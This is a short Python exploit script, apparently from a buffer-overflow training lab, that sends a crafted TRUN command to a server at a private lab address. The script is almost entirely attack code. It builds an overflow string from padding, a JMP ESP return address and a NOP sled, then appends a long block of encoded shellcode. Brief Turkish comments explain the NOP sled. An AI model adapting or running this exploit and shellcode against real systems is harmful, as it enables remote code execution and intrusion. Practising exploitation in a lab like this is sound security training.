#!/usr/bin/python3
import socket
import sys


overflow_payload = ("\xba\x47\xa7\x45\x4f\xdb\xcc\xd9\x74\x24\xf4\x5d\x2b\xc9"
"\xb1\x52\x31\x55\x12\x03\x55\x12\x83\xaa\x5b\xa7\xba\xc8"
"\x4c\xaa\x45\x30\x8d\xcb\xcc\xd5\xbc\xcb\xab\x9e\xef\xfb"
"\xb8\xf2\x03\x77\xec\xe6\x90\xf5\x39\x09\x10\xb3\x1f\x24"
"\xa1\xe8\x5c\x27\x21\xf3\xb0\x87\x18\x3c\xc5\xc6\x5d\x21"
"\x24\x9a\x36\x2d\x9b\x0a\x32\x7b\x20\xa1\x08\x6d\x20\x56"
"\xd8\x8c\x01\xc9\x52\xd7\x81\xe8\xb7\x63\x88\xf2\xd4\x4e"
"\x42\x89\x2f\x24\x55\x5b\x7e\xc5\xfa\xa2\x4e\x34\x02\xe3"
"\x69\xa7\x71\x1d\x8a\x5a\x82\xda\xf0\x80\x07\xf8\x53\x42"
"\xbf\x24\x65\x87\x26\xaf\x69\x6c\x2c\xf7\x6d\x73\xe1\x8c"
"\x8a\xf8\x04\x42\x1b\xba\x22\x46\x47\x18\x4a\xdf\x2d\xcf"
"\x73\x3f\x8e\xb0\xd1\x34\x23\xa4\x6b\x17\x2c\x09\x46\xa7"
"\xac\x05\xd1\xd4\x9e\x8a\x49\x72\x93\x43\x54\x85\xd4\x79"
"\x20\x19\x2b\x82\x51\x30\xe8\xd6\x01\x2a\xd9\x56\xca\xaa"
"\xe6\x82\x5d\xfa\x48\x7d\x1e\xaa\x28\x2d\xf6\xa0\xa6\x12"
"\xe6\xcb\x6c\x3b\x8d\x36\xe7\x4e\x52\x3a\xf2\x26\x50\x3a"
"\xed\xea\xdd\xdc\x67\x03\x88\x77\x10\xba\x91\x03\x81\x43"
"\x0c\x6e\x81\xc8\xa3\x8f\x4c\x39\xc9\x83\x39\xc9\x84\xf9"
"\xec\xd6\x32\x95\x73\x44\xd9\x65\xfd\x75\x76\x32\xaa\x48"
"\x8f\xd6\x46\xf2\x39\xc4\x9a\x62\x01\x4c\x41\x57\x8c\x4d"
"\x04\xe3\xaa\x5d\xd0\xec\xf6\x09\x8c\xba\xa0\xe7\x6a\x15"
"\x03\x51\x25\xca\xcd\x35\xb0\x20\xce\x43\xbd\x6c\xb8\xab"
"\x0c\xd9\xfd\xd4\xa1\x8d\x09\xad\xdf\x2d\xf5\x64\x64\x4d"
"\x14\xac\x91\xe6\x81\x25\x18\x6b\x32\x90\x5f\x92\xb1\x10"
"\x20\x61\xa9\x51\x25\x2d\x6d\x8a\x57\x3e\x18\xac\xc4\x3f"
"\x09")

#625011af
string_to_send = "TRUN /.:/" + "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow_payload
#NoOp: JMP/ESP ve Payload arasında hiç bir işlem yapılmayan Assembly kodları verilir(genelde).
#Hiç bir işlem yapmaz ama ikisi arasında bir es vermek sistem için daha mantıklıdır.
#Bit sınırı varsa Essiz ne denenebilir veya sayı değiştirilebilir.
#string_to_send = "TRUN /.:/" + "A" * 2003 + "\xaf\x11\x50\x62" + overflow_payload
try:
    mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    mysocket.connect(("10.0.2.4", 9999))
    byties = string_to_send.encode(encoding="latin1")
    mysocket.send(byties)
    mysocket.close()

except KeyboardInterrupt:
    print("Crashed at " + str(len(string_to_send)))
    sys.exit()
except Exception as e:
    print(e)
    sys.exit()